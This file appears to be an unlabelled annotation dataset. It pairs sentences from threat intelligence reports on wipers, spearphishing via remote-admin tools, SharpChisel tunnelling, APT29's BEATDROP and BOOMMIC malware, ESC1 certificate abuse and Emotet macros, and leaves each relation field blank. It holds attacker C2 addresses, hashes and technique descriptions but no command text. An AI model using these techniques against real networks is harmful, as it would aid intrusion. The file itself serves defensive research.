        "S2": "This preceding file is not malicious but is considered risky because it is the original driver.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S47<=>S49",
        "S1": "The wiper creates a service to run the driver with the following command:",
        "S2": "The following screenshot shows the execution of this command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S50<=>S53",
        "S1": "The malware overwrites every file in c:\\Windows\\System32, placing the machine in a critical state.",
        "S2": "Finally, it forces the reboot with the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S55<=>S57",
        "S1": "The worm component is extracted from the resources from the dropper.",
        "S2": "The worm component can take the following names:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S55<=>S59",
        "S1": "The worm component is extracted from the resources from the dropper.",
        "S2": "Although the worm component can spread the dropper and connect to a remote server, the component was not used in this version.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md::S57<=>S59",
        "S1": "The worm component can take the following names:",
        "S2": "Although the worm component can spread the dropper and connect to a remote server, the component was not used in this version.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S0<=>S2",
        "S1": "During our research, we observed a spearphishing email allegedly from a government agency.",
        "S2": "We have seen that one of two files may be downloaded, one being a .PDF file and the other an .RTF file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S0<=>S9",
        "S1": "During our research, we observed a spearphishing email allegedly from a government agency.",
        "S2": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S1<=>S3",
        "S1": "The email attempts to convince recipients to click the URL and download a malicious file.",
        "S2": "As with the spearphishing email, the lure documents' content attempts to convince the victim to click on another malicious URL and download a .ZIP file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S2<=>S9",
        "S1": "We have seen that one of two files may be downloaded, one being a .PDF file and the other an .RTF file.",
        "S2": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S4<=>S9",
        "S1": "The .ZIP file contains a copy of a legitimate remote administration software developed by RemoteUtilities and provides remote administration capabilities, including:",
        "S2": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S9<=>S12",
        "S1": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "S2": "When the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S9<=>S18",
        "S1": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "S2": "During our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S10<=>S18",
        "S1": "The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used.",
        "S2": "During our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S10<=>S21",
        "S1": "The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used.",
        "S2": "The same domain was mentioned in the previous research.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S12<=>S14",
        "S1": "When the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:",
        "S2": "The service then communicates with the domain id.remoteutilities.com, which belongs to RemoteUtilities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S15<=>S17",
        "S1": "This connection is related to one of its features called Internet-ID Connection.",
        "S2": "This allows the threat actor to connect to the Internet-ID server, which then connects to the actual RemoteUtilities host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S18<=>S22",
        "S1": "During our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software.",
        "S2": "We then observed the threat actors interact with the compromised host using the ScreenConnect software, executing the following commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S19<=>S21",
        "S1": "They were targeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a ScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)",
        "S2": "The same domain was mentioned in the previous research.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S20<=>S64",
        "S1": "As noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at instance-sy9at2-relay.screenconnect.com and resolves to 51.68.244.39.",
        "S2": "The script sets up a new HTTP object and then tries to disable the system's local proxy settings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S22<=>S26",
        "S1": "We then observed the threat actors interact with the compromised host using the ScreenConnect software, executing the following commands.",
        "S2": "However, we did not have access to the a.ps1 file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S23<=>S38",
        "S1": "The command above allows the attacker to get all the users from the domain controller.",
        "S2": "We believe that the threat actor was unable to configure SharpChisel to work correctly.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S25<=>S34",
        "S1": "This is a command to execute a PowerShell script of some kind.",
        "S2": "Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S27<=>S38",
        "S1": "We are not sure what functionality is provided here.",
        "S2": "We believe that the threat actor was unable to configure SharpChisel to work correctly.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S29<=>S40",
        "S1": "The command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\\programdata directory.",
        "S2": "The command connects to the C&C server, downloads procdump64.exe, and saves the file in the C:\\programdata directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S29<=>S51",
        "S1": "The command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\\programdata directory.",
        "S2": "The out1.exe RAT has the following capabilities:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S30<=>S32",
        "S1": "The name SharpChisel may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called chisel.",
        "S2": "The following command then configures SharpChisel:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S31<=>S33",
        "S1": "The above IP address is geolocated to a server in Iran.",
        "S2": "This directs all traffic to the localhost at port 9999 to the same remote server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S32<=>S34",
        "S1": "The following command then configures SharpChisel:",
        "S2": "Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S33<=>S35",
        "S1": "This directs all traffic to the localhost at port 9999 to the same remote server.",
        "S2": "This time, traffic will be forwarded to the server over port 443.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S34<=>S37",
        "S1": "Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:",
        "S2": "It is then configured with the following command line PowerShell command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S34<=>S36",
        "S1": "Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:",
        "S2": "A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S36<=>S40",
        "S1": "A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command:",
        "S2": "The command connects to the C&C server, downloads procdump64.exe, and saves the file in the C:\\programdata directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S36<=>S38",
        "S1": "A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command:",
        "S2": "We believe that the threat actor was unable to configure SharpChisel to work correctly.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S37<=>S41",
        "S1": "It is then configured with the following command line PowerShell command:",
        "S2": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S38<=>S41",
        "S1": "We believe that the threat actor was unable to configure SharpChisel to work correctly.",
        "S2": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S39<=>S41",
        "S1": "The use of the following command provides additional evidence to support our assumption:",
        "S2": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S40<=>S44",
        "S1": "The command connects to the C&C server, downloads procdump64.exe, and saves the file in the C:\\programdata directory.",
        "S2": "We conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S41<=>S43",
        "S1": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.",
        "S2": "We then see the threat actor again attempting to use SharpChisel several times using the following command:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S41<=>S46",
        "S1": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.",
        "S2": "The following PowerShell command was used for this:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S43<=>S61",
        "S1": "We then see the threat actor again attempting to use SharpChisel several times using the following command:",
        "S2": "They again attempted to use SharpChisel with no success:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S43<=>S45",
        "S1": "We then see the threat actor again attempting to use SharpChisel several times using the following command:",
        "S2": "Following the unsuccessful attempt to configure a tunnel connection to their C&C server, the threat actors downloaded a remote access tool (RAT) and attempted to configure it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S44<=>S48",
        "S1": "We conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools.",
        "S2": "Using a UPX unpacker, we were able to extract the contents, which consists of a Python executable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S45<=>S61",
        "S1": "Following the unsuccessful attempt to configure a tunnel connection to their C&C server, the threat actors downloaded a remote access tool (RAT) and attempted to configure it.",
        "S2": "They again attempted to use SharpChisel with no success:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S46<=>S70",
        "S1": "The following PowerShell command was used for this:",
        "S2": "The PowerShell backdoor has the following capabilities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S49<=>S60",
        "S1": "We then decompiled the python executable using pyinstxtractor.py to get all of the Python bytecode files.",
        "S2": "Following the use of browser64.exe, we observed the following command being executed:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S60<=>S62",
        "S1": "Following the use of browser64.exe, we observed the following command being executed:",
        "S2": "Finally, we observed a persistence mechanism being set using the following commands:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S63<=>S66",
        "S1": "We were able to get a copy of newsblog.js, which is a simple VBS downloader that communicates with the following URL: hxxp://23[.]95[.]215[.]100:8008/index.jsp/7e95a3d753cc4a17793ef9513e030b49/4t2Fg7k6wWRnKgd9",
        "S2": "At the time of our analysis, this server was still available.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md::S65<=>S67",
        "S1": "The script then executes an HTTP GET request to the C&C URL, grabs the server's response, and sleeps for 10 seconds.",
        "S2": "The response from the server contains an encoded PowerShell script, which is executed in memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S0<=>S2",
        "S1": "To gain access to a victim environment, APT29 sent spear-phishing emails disguised as embassy administrative updates.",
        "S2": "APT29 targeted large lists of recipients that Mandiant suspected were primarily publicly listed points of contact of embassy personnel.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S1<=>S3",
        "S1": "These phishing emails used legitimate, but compromised email addresses from other diplomatic entities.",
        "S2": "These phishing emails utilized a malicious HTML dropper tracked as ROOTSAW, that makes use of a technique known as HTML smuggling to deliver an IMG or ISO file to a victim system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S2<=>S11",
        "S1": "APT29 targeted large lists of recipients that Mandiant suspected were primarily publicly listed points of contact of embassy personnel.",
        "S2": "The LNK utilized by APT29 in the early waves of this campaign shared multiple characteristics with those identified in campaigns from 2021, including the use of a specific icon location, as well as the machine ID and MAC address.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S2<=>S34",
        "S1": "APT29 targeted large lists of recipients that Mandiant suspected were primarily publicly listed points of contact of embassy personnel.",
        "S2": "The initial User Agent string was related to Apple iPads, however Mandiant observed a shift in TTPs in later BEATDROP samples to utilizing more commonly observed Windows User Agent strings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S5<=>S7",
        "S1": "On Windows 10 or later, the image file is mounted when double-clicked and the user is presented with the image file as the folder contents in Windows Explorer.",
        "S2": "If the user clicks the LNK file, the \u201cTarget\u201d command will execute as normal.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S6<=>S8",
        "S1": "The image file contains two additional files, a Windows shortcut (LNK) file and a malicious DLL.",
        "S2": "This mechanism lures the victim into opening the LNK file and thus inadvertently launches the malicious DLL.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S6<=>S10",
        "S1": "The image file contains two additional files, a Windows shortcut (LNK) file and a malicious DLL.",
        "S2": "This prevents a Windows operating system warning message for files opened from ISO or IMG image files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S8<=>S11",
        "S1": "This mechanism lures the victim into opening the LNK file and thus inadvertently launches the malicious DLL.",
        "S2": "The LNK utilized by APT29 in the early waves of this campaign shared multiple characteristics with those identified in campaigns from 2021, including the use of a specific icon location, as well as the machine ID and MAC address.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S12<=>S16",
        "S1": "One technique observed being used by APT29 was using LNK file extensions that have a different icon than the target application or document, making the shortcut appear as a document rather than a program to launch.",
        "S2": "Mandiant also identified APT29 utilizing a malicious docx to deliver an HTA dropper, resulting in the delivery and execution of BEATDROP on a target system, in a separate but similar phishing campaign.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S12<=>S15",
        "S1": "One technique observed being used by APT29 was using LNK file extensions that have a different icon than the target application or document, making the shortcut appear as a document rather than a program to launch.",
        "S2": "The \u201cTarget\u201d in the LNK will execute the DLL with rundll32.exe and one of the DLL\u2019s exports:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S17<=>S21",
        "S1": "BEATDROP is a downloader written in C that makes use of Trello for C2.",
        "S2": "This information is used to create a victim ID, which is used by BEATDROP to store and retrieve victim payloads from its C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S17<=>S22",
        "S1": "BEATDROP is a downloader written in C that makes use of Trello for C2.",
        "S2": "Once the victim ID is created, BEATDROP will make an initial request to Trello to identify whether the current victim has already been compromised.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S22<=>S32",
        "S1": "Once the victim ID is created, BEATDROP will make an initial request to Trello to identify whether the current victim has already been compromised.",
        "S2": "In the case of using the download API however, Trello requires the use of a header which is also embedded in the BEATDROP samples:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S22<=>S24",
        "S1": "Once the victim ID is created, BEATDROP will make an initial request to Trello to identify whether the current victim has already been compromised.",
        "S2": "BEATDROP then uses the user ID received from the URL in Figure 9 to list the boards related to the user, which contain all current victims.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S30<=>S35",
        "S1": "The final URL will deliver the payload AES encrypted as its response.",
        "S2": "BEATDROP is an ideal example of APT29\u2019s continued efforts to obfuscate its activity and maintain persistent access.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S32<=>S87",
        "S1": "In the case of using the download API however, Trello requires the use of a header which is also embedded in the BEATDROP samples:",
        "S2": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S34<=>S36",
        "S1": "The initial User Agent string was related to Apple iPads, however Mandiant observed a shift in TTPs in later BEATDROP samples to utilizing more commonly observed Windows User Agent strings.",
        "S2": "Following multiple waves of phishing utilizing BEATDROP to target diplomatic entities, Mandiant along with other researchers identified APT29 moving away from BEATDROP to a novel C++ BEACON loader in their latest campaigns against diplomatic entities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S36<=>S62",
        "S1": "Following multiple waves of phishing utilizing BEATDROP to target diplomatic entities, Mandiant along with other researchers identified APT29 moving away from BEATDROP to a novel C++ BEACON loader in their latest campaigns against diplomatic entities.",
        "S2": "Mandiant observed APT29 leveraging compromised websites as the C2 for BOOMMIC.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S37<=>S41",
        "S1": "Several scenarios could explain this shift in tooling including the possibility that BEATDROP was no longer providing value to the group in terms of capability, or reflective of operational TTPs to periodically retool for the purposes of evading detection.",
        "S2": "APT29 first deployed BOOMMIC within minutes following the successful execution of BEATDROP.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S38<=>S40",
        "S1": "Following the successful deployment of BEATDROP to deliver and execute a payload, APT29 was observed leveraging BOOMMIC to further establish a foothold within the environment.",
        "S2": "APT29 executed BOOMMIC through DLL Side Loading of a modified version.dll by a legitimate Java binary, jucheck.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S44<=>S60",
        "S1": "APT29 then executed jucheck.exe via wmic which then loaded and executed BOOMMIC based on DLL Side Loading.",
        "S2": "Once the host id has been created, BOOMMIC passes this value to the function used to download and execute payloads to be used as part of the request.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S45<=>S50",
        "S1": "Version.dll and jucheck.exe are both important pieces of the execution chain used to launch BOOMMIC.",
        "S2": "When version.dll imports BOOMMIC, it also executes BOOMIC\u2019s DllMain function, which can be seen in Figure 22.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S62<=>S64",
        "S1": "Mandiant observed APT29 leveraging compromised websites as the C2 for BOOMMIC.",
        "S2": "Mandiant observed APT29 quickly move to escalate their privileges within domains once access was established.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S63<=>S75",
        "S1": "Once a payload is successfully downloaded, BOOMMIC XOR decodes and then executes it in memory.",
        "S2": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S64<=>S71",
        "S1": "Mandiant observed APT29 quickly move to escalate their privileges within domains once access was established.",
        "S2": "A brief overview of the technique as used by APT29 in actual compromises that Mandiant investigated follows.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S65<=>S75",
        "S1": "In multiple cases, APT29 was able to gain Domain Admin in less than 12 hours from the initial phishing payload\u2019s execution.",
        "S2": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S67<=>S109",
        "S1": "In one instance, APT29 was observed writing files that contained Kerberos tickets most likely to be used in Pass the Ticket attacks or for offline cracking.",
        "S2": "This is further supported by the activity identified by Mandiant that saw APT29 writing zip files that contained Kerberos tickets as well as the creation and most likely exportation of malicious certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S68<=>S70",
        "S1": "APT29 was also observed exploiting misconfigured certificate templates to allow them to impersonate admin users.",
        "S2": "This recent technique, which is well documented in a report from SpecterOps and was presented at Blackhat in August 2021, gives the attacker the ability to quickly escalate their privileges within the environment, but also provides a method for long term persistence through the creation of malicious certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S69<=>S71",
        "S1": "From here, APT29 created additional malicious certificates which they used to move laterally within the environment.",
        "S2": "A brief overview of the technique as used by APT29 in actual compromises that Mandiant investigated follows.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S70<=>S75",
        "S1": "This recent technique, which is well documented in a report from SpecterOps and was presented at Blackhat in August 2021, gives the attacker the ability to quickly escalate their privileges within the environment, but also provides a method for long term persistence through the creation of malicious certificates.",
        "S2": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S71<=>S81",
        "S1": "A brief overview of the technique as used by APT29 in actual compromises that Mandiant investigated follows.",
        "S2": "In multiple cases the attacker found certificate templates with \u201cDomain Users\u201d enrollment rights, meaning all users can request the certificate, a usage including \u201cClient Authentication\u201d, meaning the certificate can be used to authenticate users, and a setting allowing the Subject and SAN to be specified by the requester (\u201cENROLLEE_SUPPLIES_SUBJECT\u201d).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S71<=>S97",
        "S1": "A brief overview of the technique as used by APT29 in actual compromises that Mandiant investigated follows.",
        "S2": "Mandiant observed APT29 quickly moving laterally within an environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S72<=>S95",
        "S1": "Microsoft offers \u201cActive Directory Certificate Services\u201d (AD CS) for providing certificate enrollment, revocation and trust setup.",
        "S2": "Microsoft fixed this in MS14-025 which removed the option of configuring Group Policy Preferences with the \u201ccpassword\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S75<=>S87",
        "S1": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "S2": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S75<=>S86",
        "S1": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "S2": "The linked SpecterOps document provides much more detail and additional techniques besides this one example.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S81<=>S84",
        "S1": "In multiple cases the attacker found certificate templates with \u201cDomain Users\u201d enrollment rights, meaning all users can request the certificate, a usage including \u201cClient Authentication\u201d, meaning the certificate can be used to authenticate users, and a setting allowing the Subject and SAN to be specified by the requester (\u201cENROLLEE_SUPPLIES_SUBJECT\u201d).",
        "S2": "These settings allowed the attacker to request a certificate with a low privileged account and specify a high-privileged account in the SAN field and use this certificate for authentication.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S82<=>S87",
        "S1": "When performing authentication to Active Directory with Kerberos using the Public Key Cryptography for Initial Authentication (PKINIT) Kerberos flow, the Domain Controller will verify the SAN against the User Principal Name (UPN) of the authenticating principal.",
        "S2": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S84<=>S97",
        "S1": "These settings allowed the attacker to request a certificate with a low privileged account and specify a high-privileged account in the SAN field and use this certificate for authentication.",
        "S2": "Mandiant observed APT29 quickly moving laterally within an environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S86<=>S109",
        "S1": "The linked SpecterOps document provides much more detail and additional techniques besides this one example.",
        "S2": "This is further supported by the activity identified by Mandiant that saw APT29 writing zip files that contained Kerberos tickets as well as the creation and most likely exportation of malicious certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S87<=>S91",
        "S1": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "S2": "APT29 was also observed by Mandiant using nltest to enumerate Domain Controllers on the domain:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S87<=>S90",
        "S1": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "S2": "APT29 was observed using the net command widely to enumerate users and groups.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S89<=>S99",
        "S1": "One of the first commands employed by the group was the windows net command.",
        "S2": "APT29 was first observed moving laterally after the group was seen staging and deploying SMB BEACON to multiple systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S92<=>S108",
        "S1": "One notable TTP observed by APT29 was the hunting for passwords stored in SYSVOL.",
        "S2": "The use of these techniques and tools represents the multiple means by which APT29 attempts to maintain access within an environment.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S93<=>S95",
        "S1": "This technique relies on passwords that are stored as part of Group Policy Preferences.",
        "S2": "Microsoft fixed this in MS14-025 which removed the option of configuring Group Policy Preferences with the \u201ccpassword\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S97<=>S107",
        "S1": "Mandiant observed APT29 quickly moving laterally within an environment.",
        "S2": "As previously noted, Mandiant has observed the group widely using scheduled tasks, run keys, malicious certificates, and in-memory backdoors, in some cases multiple per system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S100<=>S104",
        "S1": "To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user.",
        "S2": "APT29 was then observed utilizing the impersonation of a privileged user to copy SharedReality.dll to the Temp directory of multiple systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S100<=>S105",
        "S1": "To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user.",
        "S2": "The group then deployed it via a scheduled task named SharedRealitySvcDLC which was installed and executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S102<=>S104",
        "S1": "Analysis of SharedReality.dll identified it to be a memory-only dropper written in Go language that decrypts and executes an embedded BEACON payload.",
        "S2": "APT29 was then observed utilizing the impersonation of a privileged user to copy SharedReality.dll to the Temp directory of multiple systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md::S105<=>S107",
        "S1": "The group then deployed it via a scheduled task named SharedRealitySvcDLC which was installed and executed.",
        "S2": "As previously noted, Mandiant has observed the group widely using scheduled tasks, run keys, malicious certificates, and in-memory backdoors, in some cases multiple per system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md::S1<=>S3",
        "S1": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "S2": "When a user opens the document, it claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md::S2<=>S4",
        "S1": "It reveals that a macro is embedded in the document.",
        "S2": "VBA (Visual Basic for Applications) codes in the embedded macro are given below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md::S3<=>S8",
        "S1": "When a user opens the document, it claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "S2": "However, TextBox1 is not seen by the victim, it is hidden in the document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md::S9<=>S23",
        "S1": "We used the Debug.Print method to see the content of the Textbox1, and accessed the following code that is executed by the Interaction.Shell method:",
        "S2": "When we started to examine the 150.exe file (SHA256: 5456471B260E664E9485D2CB8321D8E3B3033F700A5BDAAFC94E4BA8046FB87D), we realized that it is the infamous Emotet trojan.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md::S25<=>S27",
        "S1": "After a few failed attempts, it downloaded archivesymbol.exe (SHA256: 5DA7A92311FDA255EFAC52C6BFEBCED31BD584453F6BB4F8DE6CDD1B2505B00F) file from 201.190.150.60:443 to C:\\Users\\admin\\AppData\\Local\\archivesymbol\\ folder.",
        "S2": "In order to become persistent on the victim system, Archivesymbol.exe adds its full path to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key in the Registry.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S0<=>S2",
        "S1": "During this campaign, the macro-enabled Word document (File name: ir_drones.docm) shown below is downloaded from the domain \u201chttp[:]//news-spot.live\u201d disguising itself as a news report related to military affairs in Iran.",
        "S2": "Once the user enables the macro content, the following AutoOpen() function is executed which increases picture brightness using \u201cPictureFormat.Brightness = 0.5\u201d revealing content with the headline, \u201cIran Deploys Drones To Target Internal Threat, Protect External Interests.\u201d",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S1<=>S4",
